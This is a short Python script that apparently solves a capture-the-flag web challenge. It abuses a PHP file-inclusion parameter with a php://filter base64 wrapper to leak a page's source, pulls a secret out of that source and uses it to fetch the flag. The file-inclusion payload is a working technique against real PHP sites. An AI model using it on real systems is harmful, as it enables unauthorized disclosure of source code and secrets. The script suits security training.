import requests
from base64 import b64decode
from bs4 import BeautifulSoup

# https://www.php.net/manual/en/wrappers.php.php

url = "http://splashbox.challs.olicyber.it/"

payload = "php://filter/convert.base64-encode/resource=flag"

r = requests.get(url + f"?page={payload}")
soup = BeautifulSoup(r.text, "html.parser")

enc_secret = soup.find("div").text.strip()
dec_secret = b64decode(enc_secret).decode().split("=== \"")[1].split("\")")[0]

r = requests.get(url + "flag.php", params={"secret":dec_secret})
print(r.text)